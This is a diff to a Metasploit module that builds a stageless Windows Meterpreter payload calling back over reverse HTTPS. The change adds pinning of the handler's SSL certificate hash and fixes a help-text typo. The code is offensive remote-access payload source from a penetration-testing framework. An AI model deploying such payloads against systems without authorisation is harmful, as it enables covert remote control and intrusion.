@@ -8,6 +8,7 @@ require 'msf/core/handler/reverse_https'
 require 'msf/core/payload/windows/stageless_meterpreter'
 require 'msf/base/sessions/meterpreter_x86_win'
 require 'msf/base/sessions/meterpreter_options'
+require 'rex/parser/x509_certificate'
 
 module Metasploit3
 
@@ -15,6 +16,7 @@ module Metasploit3
 
   include Msf::Payload::Windows::StagelessMeterpreter
   include Msf::Sessions::MeterpreterOptions
+  include Msf::Payload::Windows::VerifySsl
 
   def initialize(info = {})
 
@@ -30,7 +32,7 @@ module Metasploit3
       ))
 
     register_options([
-      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
+      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
     ], self.class)
   end
 
@@ -54,9 +56,13 @@ module Metasploit3
       #  end
       #end
 
-      Rex::Payloads::Meterpreter::Patch.patch_passive_service! dll,
+      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
+                                           datastore['HandlerSSLCert'])
+
+      Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
         :url            => url,
         :ssl            => true,
+        :ssl_cert_hash  => verify_cert_hash,
         :expiration     => datastore['SessionExpirationTimeout'].to_i,
         :comm_timeout   => datastore['SessionCommunicationTimeout'].to_i,
         :ua             => datastore['MeterpreterUserAgent'],
@@ -64,8 +70,9 @@ module Metasploit3
         :proxyport      => datastore['PROXYPORT'],
         :proxy_type     => datastore['PROXY_TYPE'],
         :proxy_username => datastore['PROXY_USERNAME'],
-        :proxy_password => datastore['PROXY_PASSWORD']
+        :proxy_password => datastore['PROXY_PASSWORD'])
     end
+
   end
 
 end
